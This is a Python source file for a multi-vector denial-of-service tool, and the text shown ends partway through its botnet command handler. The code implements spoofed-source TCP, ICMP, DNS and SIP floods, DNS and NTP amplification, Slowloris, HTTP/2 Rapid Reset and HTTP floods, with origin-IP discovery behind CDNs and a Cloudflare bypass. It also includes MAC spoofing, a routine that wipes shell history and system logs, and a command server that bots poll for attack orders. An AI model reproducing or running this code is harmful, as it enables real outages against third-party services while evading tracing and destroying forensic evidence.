#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗ ███████╗║
║                         ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝ ██╔════╝║
║                         ██████╔╝██║     ███████║██║     █████╔╝ ██║██║  ███╗█████╗  ║
║                         ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║   ██║██╔══╝  ║
║                         ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╔╝███████╗║
║                         ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝║
║                                                                               ║
║       FIXED VERSION – RESOURCE‑SAFE, STABLE, AND ERROR‑HANDLED              ║
║       Extern Established 2025                                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, subprocess, platform, random, time, threading, socket, struct
import base64, hashlib, ssl, http.client, urllib.request, urllib.parse, re
from urllib.parse import urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer

# ================================================================
# DEPENDENCY INSTALLER (tolerant)
# ================================================================
REQUIRED = ['scapy', 'requests', 'h2', 'termcolor', 'cryptography', 'dnspython']
def install_deps():
    missing = []
    for pkg in REQUIRED:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    if not missing:
        print("[+] All dependencies satisfied.")
        return
    print(f"[!] Missing: {', '.join(missing)}")
    print("[*] Installing...")
    apt_packages = {'scapy':'python3-scapy','requests':'python3-requests',
                    'cryptography':'python3-cryptography','dnspython':'python3-dnspython'}
    for pkg in missing[:]:
        if pkg in apt_packages:
            try:
                subprocess.check_call(['apt','install','-y',apt_packages[pkg]], stderr=subprocess.DEVNULL)
                missing.remove(pkg)
                print(f"[+] Installed {pkg} via apt")
            except: pass
    if missing:
        for pkg in missing[:]:
            try:
                subprocess.check_call(['pip3','install','--break-system-packages',pkg], stderr=subprocess.DEVNULL)
                missing.remove(pkg)
                print(f"[+] Installed {pkg} via pip")
            except: pass
    if missing and os.path.isdir('offline_packages'):
        folder_map = {'scapy':'scapy-master','requests':'requests-main','h2':'h2-master',
                      'termcolor':'termcolor-main','cryptography':'cryptography-main','dnspython':'dnspython-main'}
        for pkg in missing[:]:
            if folder_map.get(pkg) and os.path.isdir(f'offline_packages/{folder_map[pkg]}'):
                subprocess.check_call(['pip3','install',f'offline_packages/{folder_map[pkg]}'], stderr=subprocess.DEVNULL)
                missing.remove(pkg)
                print(f"[+] Installed {pkg} from offline")
    if missing:
        print("[WARN] Still missing:", missing)
install_deps()

# ================================================================
# IMPORT MODULES
# ================================================================
HAS_SCAPY = HAS_REQUESTS = HAS_H2 = HAS_TERMCOLOR = HAS_CRYPTO = HAS_DNSPYTHON = False
try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, TCP, ICMP, ARP, Ether
    HAS_SCAPY = True
except: pass
try:
    import requests
    HAS_REQUESTS = True
except: pass
try:
    import h2.connection, h2.events
    HAS_H2 = True
except: pass
try:
    from termcolor import colored
    HAS_TERMCOLOR = True
except:
    def colored(text, color=None, attrs=None): return text
try:
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import x25519
    HAS_CRYPTO = True
except: pass
try:
    import dns.resolver
    HAS_DNSPYTHON = True
except: pass

# ================================================================
# ROOT CHECK
# ================================================================
def check_root():
    if os.geteuid() != 0:
        print(colored("[!] WARNING: Raw packet attacks (TCP/UDP/ICMP) require root privileges.", 'red'))
        print(colored("[!] HTTP/HTTPS attacks will still work without root.", 'yellow'))
        return False
    return True
IS_ROOT = check_root()

# ================================================================
# GLOBAL ATTACK SEMAPHORE (prevents too many open files)
# ================================================================
ATTACK_SEM = threading.Semaphore(100)   # Max concurrent attack threads per bot

# ================================================================
# LOAD SAPHYRA LISTS
# ================================================================
SAPHYRA_USERAGENTS = []
SAPHYRA_REFERERS = []
def load_saphyra():
    global SAPHYRA_USERAGENTS, SAPHYRA_REFERERS
    if not os.path.exists('sphyra.txt'):
        print(colored("[!] sphyra.txt not found – Saphyra attacks disabled.", 'red'))
        return
    try:
        with open('sphyra.txt','r') as f:
            code = f.read()
        namespace = {'headers_useragents':[], 'headers_referers':[]}
        exec(code, namespace)
        SAPHYRA_USERAGENTS = namespace['init_useragent_list']()
        SAPHYRA_REFERERS = namespace['init_referer_list']()
        print(colored(f"[SAPHYRA] Loaded {len(SAPHYRA_USERAGENTS)} UAs and {len(SAPHYRA_REFERERS)} referers.", 'green'))
    except Exception as e:
        print(colored(f"[!] Failed to load sphyra.txt: {e}", 'red'))
load_saphyra()

# ================================================================
# GLOBAL STATS & STATUS THREAD
# ================================================================
stats = {
    'packets': 0,
    'requests': 0,
    'start_time': None,
    'last_command': '',
    'mode': 'idle',
    'target': '',
    'bots': 0,
    'threads': 0,
}
stats_lock = threading.Lock()
status_running = False
status_thread = None

def update_stats(packets=0, requests=0):
    with stats_lock:
        stats['packets'] += packets
        stats['requests'] += requests

def status_printer(interval=2):
    global status_running
    print(colored("\n[STATUS] Press Ctrl+C to stop.\n", 'yellow'))
    while status_running:
        with stats_lock:
            elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
            hours, rem = divmod(elapsed, 3600)
            mins, secs = divmod(rem, 60)
            elapsed_str = f"{int(hours):02d}:{int(mins):02d}:{int(secs):02d}"
            total = stats['packets'] + stats['requests']
            rate = total / elapsed if elapsed > 0 else 0
            mode = stats['mode']
            target = stats['target']
            bots = stats['bots']
            threads = stats['threads']
            last_cmd = stats['last_command']
        parts = [
            f"Time: {elapsed_str}",
            f"Total: {total:,}",
            f"Rate: {rate:,.0f}/s",
            f"Mode: {mode}",
            f"Target: {target}",
        ]
        if bots > 0:
            parts.append(f"Bots: {bots}")
        if threads > 0:
            parts.append(f"Threads: {threads}")
        if last_cmd:
            parts.append(f"Cmd: {last_cmd[:60]}")
        print(colored("[STATUS] " + " | ".join(parts), 'cyan'))
        for _ in range(interval * 10):
            if not status_running:
                break
            time.sleep(0.1)

def start_status():
    global status_running, status_thread
    if status_running:
        return
    status_running = True
    if stats['start_time'] is None:
        stats['start_time'] = time.time()
    status_thread = threading.Thread(target=status_printer, daemon=True)
    status_thread.start()

def stop_status():
    global status_running
    status_running = False
    if status_thread:
        status_thread.join(timeout=3)

# ================================================================
# PROXY & STEALTH HELPERS (unchanged)
# ================================================================
def load_proxies(filepath='proxies.txt'):
    global PROXY_LIST
    if os.path.exists(filepath):
        with open(filepath) as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
    else:
        PROXY_LIST = ['socks5://127.0.0.1:9050']
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None
def random_mac():
    return ':'.join(['%02x' % random.randint(0x00,0xff) for _ in range(6)])
def set_random_mac(interface='eth0'):
    if platform.system().lower() != 'linux': return
    try:
        new_mac = random_mac()
        subprocess.run(['ip','link','set',interface,'down'], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip','link','set',interface,'address',new_mac], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip','link','set',interface,'up'], check=True, stderr=subprocess.DEVNULL)
        print(colored(f"[OPsec] MAC randomized to {new_mac}", 'green'))
    except Exception as e:
        print(colored(f"[!] MAC change failed: {e}", 'yellow'))
def random_delay(min_sec=5, max_sec=30):
    delay = random.uniform(min_sec, max_sec)
    print(colored(f"[OPsec] Delaying attack start by {delay:.2f}s...", 'yellow'))
    time.sleep(delay)
def random_jitter(base=0.01, jitter=0.005):
    return base + random.uniform(-jitter, jitter)
def wipe_traces():
    print(colored("[OPsec] Wiping traces...", 'yellow'))
    try:
        subprocess.run('history -c', shell=True, executable='/bin/bash', stderr=subprocess.DEVNULL)
        subprocess.run('rm -f ~/.bash_history ~/.zsh_history /root/.bash_history', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -f /var/log/apt/*.log', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('journalctl --rotate', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('journalctl --vacuum-time=1s', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -rf ~/.cache/pip /root/.cache/pip', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -rf /tmp/* /dev/shm/*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('echo "" > /var/log/syslog', shell=True, stderr=subprocess.DEVNULL)
        print(colored("[+] Traces wiped.", 'green'))
    except Exception as e:
        print(colored(f"[!] Partial wipe: {e}", 'red'))

# ================================================================
# CDN DETECTION (unchanged)
# ================================================================
def detect_cdn(domain):
    info = {'cdn':None, 'origin_ip':None, 'headers':{}}
    if HAS_DNSPYTHON:
        try:
            answers = dns.resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).lower()
                if 'cloudfront.net' in cname: info['cdn']='AWS CloudFront'
                elif 'cloudflare.net' in cname: info['cdn']='Cloudflare'
        except: pass
    if HAS_REQUESTS:
        try:
            r = requests.head(f"https://{domain}", timeout=5, verify=False)
            headers = r.headers
            if 'cf-ray' in headers or 'cf-cache-status' in headers: info['cdn']='Cloudflare'
            if 'x-amz-cf-id' in headers or 'x-amz-request-id' in headers: info['cdn']='AWS CloudFront'
            info['headers'] = headers
        except: pass
    common_subs = ['www','api','mail','ftp','admin','origin','direct']
    for sub in common_subs:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            if ip != socket.gethostbyname(domain):
                info['origin_ip'] = ip
                break
        except: pass
    return info
def resolve_target(input_str):
    global TARGET_IP, TARGET_DOMAIN
    try:
        socket.inet_aton(input_str)
        TARGET_IP = input_str
        TARGET_DOMAIN = input_str
        print(colored(f"[RESOLVE] Direct IP: {TARGET_IP}", 'green'))
        return TARGET_IP
    except socket.error:
        TARGET_DOMAIN = input_str
        try:
            TARGET_IP = socket.gethostbyname(input_str)
            print(colored(f"[RESOLVE] {input_str} -> {TARGET_IP}", 'green'))
            cdn_info = detect_cdn(input_str)
            if cdn_info['cdn']:
                print(colored(f"[CDN] Detected: {cdn_info['cdn']}", 'yellow'))
                if cdn_info['origin_ip']:
                    print(colored(f"[ORIGIN] Potential origin IP: {cdn_info['origin_ip']}", 'cyan'))
                    if get_input("Use origin IP instead? (yes/no)", default="no").lower() == 'yes':
                        TARGET_IP = cdn_info['origin_ip']
                        print(colored(f"[!] Using origin IP: {TARGET_IP}", 'green'))
            else:
                print(colored("[CDN] No clear CDN detected.", 'green'))
            return TARGET_IP
        except:
            print(colored(f"[!] Failed to resolve {input_str}", 'red'))
            return None

# ================================================================
# ATTACK FUNCTIONS (ALL FIXED WITH PROPER CLEANUP & STATS)
# ================================================================

# 1. TCP ACK Flood
def tcp_ack_flood(target, port=80, count=100, interval=0.01):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – TCP ACK flood disabled.", 'red'))
        return
    if not IS_ROOT:
        print(colored("[!] Raw packet requires root – skipping.", 'red'))
        return
    print(colored(f"[TCP] ACK flood -> {target}:{port}  ⚠️ raw traceable", 'yellow'))
    update_stats(packets=count)  # count as attempted
    for _ in range(count):
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024,65535)
            pkt = IP(src=src_ip, dst=target)/TCP(sport=src_port, dport=port, flags='A', seq=random.randint(0,2**32))
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except Exception as e:
            pass

# 2. Slowloris (fixed sockets)
def slowloris_attack(target, port=80, count=100, interval=0.01):
    print(colored(f"[SLOWLORIS] Opening connections to {target}:{port}  🌐 HTTP (proxied)", 'blue'))
    sockets = []
    update_stats(requests=count)
    try:
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target}\r\n".encode())
                sockets.append(sock)
                update_stats(requests=1)
            except:
                pass
            time.sleep(random_jitter(interval))
        while True:
            for sock in sockets[:]:
                try:
                    sock.send(b"X-Header: Keep-Alive\r\n")
                    update_stats(requests=1)
                except:
                    sockets.remove(sock)
            time.sleep(random_jitter(interval))
    except KeyboardInterrupt:
        pass
    finally:
        for sock in sockets:
            try: sock.close()
            except: pass

# 3. DNS NXDOMAIN Flood
def dns_nxdomain_flood(target, count=100, interval=0.01):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy or root missing – NXDOMAIN flood disabled.", 'red'))
        return
    print(colored(f"[DNS] NXDOMAIN flood -> {target}  ⚠️ raw traceable", 'cyan'))
    update_stats(packets=count)
    for _ in range(count):
        try:
            random_domain = f"{random.randint(10000,99999)}.example.com"
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            pkt = IP(src=src_ip, dst=target)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=random_domain, qtype="A"))
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except:
            pass

# 4. ICMP Blacknurse
def icmp_blacknurse(target, count=100, interval=0.01):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy or root missing – ICMP Blacknurse disabled.", 'red'))
        return
    print(colored(f"[ICMP] Blacknurse -> {target}  ⚠️ raw traceable", 'magenta'))
    update_stats(packets=count)
    for _ in range(count):
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            pkt = IP(src=src_ip, dst=target)/ICMP(type=3, code=3)
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except:
            pass

# 5. DNS Amplification
def dns_amplify(target, reflectors, count, interval):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy/root missing – DNS Amp disabled.", 'red'))
        return
    print(colored(f"[UDP] DNS Amp -> {target}  ⚠️ raw traceable", 'cyan'))
    update_stats(packets=count*len(reflectors))
    for ref in reflectors:
        for _ in range(count):
            try:
                src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                pkt = IP(src=src_ip, dst=ref)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
                send(pkt, verbose=False)
                update_stats(packets=1)
                time.sleep(random_jitter(interval))
            except:
                pass

# 6. NTP Amplification
def ntp_amplify(target, reflectors, count, interval):
    if not IS_ROOT:
        print(colored("[!] Root required for raw NTP – disabled.", 'red'))
        return
    print(colored(f"[UDP] NTP Amp -> {target}  ⚠️ raw traceable", 'cyan'))
    update_stats(packets=count*len(reflectors))
    for ref in reflectors:
        for _ in range(count):
            try:
                src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
                payload = b'\x17\x00\x03\x2a' + b'\x00'*8
                pkt = struct.pack('!BBHHHBBH4s4s',0x45,0,40,0,0,64,socket.IPPROTO_UDP,0,socket.inet_aton(src_ip),socket.inet_aton(ref))
                pkt += struct.pack('!HHHH',123,123,len(payload)+8,0)+payload
                sock.sendto(pkt,(ref,123))
                sock.close()
                update_stats(packets=1)
                time.sleep(random_jitter(interval))
            except:
                pass

# 7. TCP SYN Flood
def tcp_syn_flood(target, port=80, count=100, interval=0.01):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy/root missing – SYN flood disabled.", 'red'))
        return
    print(colored(f"[TCP] SYN flood -> {target}:{port}  ⚠️ raw traceable", 'yellow'))
    update_stats(packets=count)
    for _ in range(count):
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024,65535)
            pkt = IP(src=src_ip, dst=target)/TCP(sport=src_port, dport=port, flags='S', seq=random.randint(0,2**32))
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except:
            pass

# 8. ICMP Flood
def icmp_flood(target, count=100, interval=0.01):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy/root missing – ICMP flood disabled.", 'red'))
        return
    print(colored(f"[ICMP] Flood -> {target}  ⚠️ raw traceable", 'magenta'))
    update_stats(packets=count)
    for _ in range(count):
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            pkt = IP(src=src_ip, dst=target)/ICMP()
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except:
            pass

# 9. SIP INVITE Flood
def sip_invite_flood(target, port=5060, count=100, interval=0.01):
    if not HAS_SCAPY or not IS_ROOT:
        print(colored("[!] Scapy/root missing – SIP flood disabled.", 'red'))
        return
    print(colored(f"[SIP] INVITE flood -> {target}:{port}  ⚠️ raw traceable", 'blue'))
    update_stats(packets=count)
    for _ in range(count):
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            call_id = f"{random.randint(1000,9999)}@{random.randint(1000,9999)}"
            sip_payload = (f"INVITE sip:{target} SIP/2.0\r\n"
                           f"Via: SIP/2.0/UDP {src_ip}:{random.randint(1024,65535)};branch=z9hG4bK{random.randint(1000,9999)}\r\n"
                           f"From: <sip:{random.randint(1000,9999)}@{src_ip}>;tag={random.randint(1000,9999)}\r\n"
                           f"To: <sip:{target}>\r\n"
                           f"Call-ID: {call_id}\r\n"
                           f"CSeq: 1 INVITE\r\n"
                           f"Contact: <sip:{random.randint(1000,9999)}@{src_ip}>\r\n"
                           f"Content-Type: application/sdp\r\n"
                           f"Content-Length: 0\r\n\r\n")
            pkt = IP(src=src_ip, dst=target)/UDP(sport=random.randint(1024,65535), dport=port)/Raw(load=sip_payload.encode())
            send(pkt, verbose=False)
            update_stats(packets=1)
            time.sleep(random_jitter(interval))
        except:
            pass

# 10. TLS Renegotiation (improved)
def tls_renegotiation_attack(target, port=443, count=100, interval=0.01, sni_spoof='www.google.com'):
    print(colored(f"[TLS] Renegotiation -> {target}:{port}  🌐 TLS (proxied)", 'yellow'))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    update_stats(requests=count)
    for _ in range(count):
        sock = None
        tls = None
        try:
            sock = socket.create_connection((target, port), timeout=10)
            tls = ctx.wrap_socket(sock, server_hostname=sni_spoof)
            for _ in range(5):
                try:
                    tls.renegotiate()
                    time.sleep(0.1)
                except:
                    break
            update_stats(requests=1)
        except Exception:
            pass
        finally:
            if tls:
                try: tls.close()
                except: pass
            if sock:
                try: sock.close()
                except: pass
            time.sleep(random_jitter(interval))

# 11. HTTP/2 Rapid Reset (FIXED – re‑creates socket per request)
def http2_rapid_reset_evasive(target, count, port=443, use_flare=False, sni_spoof='www.google.com', payload='', waf_tamper=False):
    if not HAS_REQUESTS or not HAS_H2:
        print(colored("[!] Missing requests/h2 – HTTP/2 disabled.", 'red'))
        return
    print(colored(f"[HTTP/2] Rapid Reset -> {target}:{port}  🌐 HTTP/2 (proxied)", 'magenta'))
    update_stats(requests=count)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ua = random_user_agent()

    # Socks5 proxy path (if used)
    proxy = get_random_proxy()
    if proxy and proxy.startswith('socks5'):
        proxies = {'https': proxy}
        headers = {'User-Agent': ua, 'Accept': '*/*', 'X-TLS-Payload': base64.b64encode(payload.encode()).decode()}
        if waf_tamper: headers['X-Oversized'] = 'A'*9000
        for _ in range(count):
            try:
                requests.get(f"https://{target}/", headers=headers, proxies=proxies, verify=False, timeout=3)
                update_stats(requests=1)
            except:
                pass
            time.sleep(random_jitter(0.01))
        return

    # Direct HTTP/2 – one new connection per request to avoid "Invalid argument" errors
    for _ in range(count):
        sock = None
        tls = None
        try:
            sock = socket.create_connection((target, port), timeout=10)
            tls = ctx.wrap_socket(sock, server_hostname=sni_spoof)
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            tls.sendall(conn.data_to_send())
            headers_list = [(':method','GET'), (':path','/'), (':scheme','https'), (':authority',target),
                            ('user-agent', ua), ('x-tls-payload', base64.b64encode(payload.encode()).decode())]
            if waf_tamper:
                headers_list.append(('x-oversized','A'*9000))
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, headers_list)
            conn.reset_stream(sid)
            tls.sendall(conn.data_to_send())
            update_stats(requests=1)
        except Exception as e:
            # Silently skip – we don't want to flood the console with errors
            pass
        finally:
            if tls:
                try: tls.close()
                except: pass
            if sock:
                try: sock.close()
                except: pass
            time.sleep(random_jitter(0.01))

# 12. HTTP HULK (fixed proxy handling)
def http_hulk_flood(target, port=80, count=100, interval=0.01, use_https=False):
    if not HAS_REQUESTS:
        print(colored("[!] Requests missing – HULK disabled.", 'red'))
        return
    print(colored(f"[HTTP-HULK] Flooding {target}:{port} (HTTPS: {use_https})  🌐 HTTP (proxied)", 'cyan'))
    update_stats(requests=count)
    methods = ['GET','POST','HEAD','PUT','DELETE']
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
                   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
                   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
                   'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)']
    referers = ['https://google.com','https://bing.com','https://yahoo.com','https://facebook.com','https://twitter.com','']
    protocol = 'https' if use_https else 'http'
    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    for _ in range(count):
        method = random.choice(methods)
        ua = random.choice(user_agents)
        ref = random.choice(referers)
        path = f"/?rand={random.randint(1,1000000)}"
        url = f"{protocol}://{target}:{port}{path}"
        headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.9',
                   'Connection':'keep-alive' if random.choice([True,False]) else 'close',
                   'Cache-Control':'no-cache', 'Pragma':'no-cache'}
        if ref: headers['Referer'] = ref
        try:
            if method == 'GET':
                requests.get(url, headers=headers, proxies=proxies, timeout=3, verify=False)
            elif method == 'POST':
                requests.post(url, headers=headers, data={'rand': random.randint(1,9999)}, proxies=proxies, timeout=3, verify=False)
            elif method == 'HEAD':
                requests.head(url, headers=headers, proxies=proxies, timeout=3, verify=False)
            elif method == 'PUT':
                requests.put(url, headers=headers, data=b'x'*random.randint(1,1024), proxies=proxies, timeout=3, verify=False)
            elif method == 'DELETE':
                requests.delete(url, headers=headers, proxies=proxies, timeout=3, verify=False)
            update_stats(requests=1)
        except:
            pass
        time.sleep(random_jitter(interval))

# 13. Saphyra HTTP Flood (unchanged)
def saphyra_http_flood(target_url, host, count=0, interval=0.01):
    if not SAPHYRA_USERAGENTS or not SAPHYRA_REFERERS:
        print(colored("[!] Saphyra lists not loaded – skipping.", 'red'))
        return
    print(colored(f"[SAPHYRA] Flooding {target_url} (host: {host})  🌐 HTTP (proxied)", 'blue'))
    if target_url.count('/') == 2: target_url += '/'
    param_joiner = '&' if '?' in target_url else '?'
    def http_call():
        query = ''.join(chr(random.randint(41,91)) for _ in range(random.randint(3,10))) + '=' + ''.join(chr(random.randint(41,91)) for _ in range(random.randint(3,10)))
        full_url = target_url + param_joiner + query
        req = urllib.request.Request(full_url)
        req.add_header('User-Agent', random.choice(SAPHYRA_USERAGENTS))
        req.add_header('Cache-Control', 'no-cache')
        req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        req.add_header('Referer', random.choice(SAPHYRA_REFERERS) + ''.join(chr(random.randint(41,91)) for _ in range(random.randint(50,100))))
        req.add_header('Keep-Alive', str(random.randint(110,160)))
        req.add_header('Connection', 'keep-alive')
        req.add_header('Host', host)
        try:
            with urllib.request.urlopen(req, timeout=3) as f:
                pass
            update_stats(requests=1)
        except: pass
    if count > 0:
        for _ in range(count):
            t = threading.Thread(target=http_call); t.daemon=True; t.start()
            time.sleep(random_jitter(interval))
    else:
        while True:
            t = threading.Thread(target=http_call); t.daemon=True; t.start()
            time.sleep(random_jitter(0.01))

# 14. hping3 (unchanged)
def hping3_attack(target, mode='udp', port=80, count=100):
    if not USE_HPING3:
        return
    print(colored(f"[hping3] {mode.upper()} -> {target}:{port}  ⚠️ raw traceable", 'blue'))
    cmd = ['hping3', '-c', str(count), '-p', str(port), '--flood']
    if mode == 'udp': cmd.append('--udp')
    elif mode == 'syn': cmd.append('--syn')
    elif mode == 'icmp': cmd.append('--icmp')
    cmd.append(target)
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(count):
            update_stats(packets=1)
            time.sleep(random_jitter(0.001))
    except:
        print("[!] hping3 not found. Install: sudo apt install hping3")

def random_user_agent():
    return random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
                         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
                         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
                         'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'])

def cloudflare_bypass_with_flaresolverr(url):
    if not HAS_REQUESTS: return None,None
    flare_url = "http://localhost:8191/v1"
    payload = {"cmd": "request.get", "url": url, "maxTimeout": 60000}
    try:
        r = requests.post(flare_url, json=payload, timeout=30)
        if r.status_code == 200:
            result = r.json()
            if result.get('status') == 'ok':
                solution = result['solution']
                cookies = {c['name']:c['value'] for c in solution.get('cookies',[])}
                return cookies, solution.get('userAgent')
    except: pass
    return None,None

# ================================================================
# GLOBALS
# ================================================================
TARGET_IP = ""
TARGET_DOMAIN = ""
USE_HPING3 = False
PROXY_LIST = []
USE_FLARE = False
SNI_SPOOF = "www.google.com"
PAYLOAD = "hidden"
WAF_TAMPER = False
THREADS = 50
COUNT = 100
INTERVAL = 0.01
ATTACK_MODES = []
STEALTH_MODE = False

BOTNET_ENABLED = False
BOT_COUNT = 0
BOT_POLL_INTERVAL = 30
BOT_RUNNING = False
BOT_THREADS = []

COMMAND_CONTENT = ""
HTTP_SERVER_PORT = 8080
HTTP_SERVER_THREAD = None
HTTP_SERVER_STOP = False

# ================================================================
# BUILT-IN COMMAND SERVER — FIXED (Threading + BrokenPipe)
# ================================================================
class CommandHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/command.txt':
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(COMMAND_CONTENT.encode())
            except BrokenPipeError:
                pass  # Client disconnected
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args): pass

def start_command_server(port=HTTP_SERVER_PORT):
    global HTTP_SERVER_PORT
    server = None
    for attempt in range(10):
        try:
            server = ThreadingHTTPServer(('127.0.0.1', port), CommandHandler)
            server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            HTTP_SERVER_PORT = port
            print(colored(f"[SERVER] Built‑in server started on http://127.0.0.1:{port}/command.txt", 'green'))
            return server, port
        except OSError as e:
            if "Address already in use" in str(e):
                print(colored(f"[!] Port {port} is busy, trying {port + 1}...", 'yellow'))
                port += 1
            else:
                raise e
    print(colored("[!] Could not find a free port after 10 attempts.", 'red'))
    return None, None

def run_server_forever(server):
    global HTTP_SERVER_STOP
    while not HTTP_SERVER_STOP:
        server.handle_request()
    server.server_close()
    print(colored("[SERVER] Command server stopped.", 'yellow'))

def start_command_server_thread(port=HTTP_SERVER_PORT):
    global HTTP_SERVER_THREAD
    if HTTP_SERVER_THREAD and HTTP_SERVER_THREAD.is_alive():
        print("[!] Command server already running.")
        return None, None
    server, actual_port = start_command_server(port)
    if server is None:
        return None, None
    HTTP_SERVER_THREAD = threading.Thread(target=run_server_forever, args=(server,), daemon=True)
    HTTP_SERVER_THREAD.start()
    time.sleep(0.1)
    return server, actual_port

def stop_command_server():
    global HTTP_SERVER_STOP
    HTTP_SERVER_STOP = True
    time.sleep(0.5)

# ================================================================
# BOTNET WORKER (FIXED – sequential blend, thread pool)
# ================================================================
def bot_fetch_command(url):
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            cmd = resp.text.strip()
            if cmd and not cmd.startswith('#'): return cmd
    except: pass
    return None

def bot_execute_command(cmd, bot_id):
    parts = cmd.split()
    if not parts: return
    mode = parts[0].lower()
    
    # BLEND: execute sequentially to avoid thread explosion
    if mode == 'blend':
        sub_cmds = ' '.join(parts[1:]).split(',')
        for sub in sub_cmds:
            sub = sub.strip()
            if sub:
                bot_execute_command(sub, bot_id)  # recursive, but sequential
        return

    params = {}
    for p in parts[1:]:
        if '=' in p:
            k,v = p.split('=',1)
            params[k]=v
    target = params.get('target','127.0.0.1')
    port = int(params.get('port',80))
    count = int(params.get('count',100))
    interval = float(params.get('interval',0.01))
    with stats_lock:
        stats['target'] = target
        stats['mode'] = mode
        stats['last_command'] = cmd

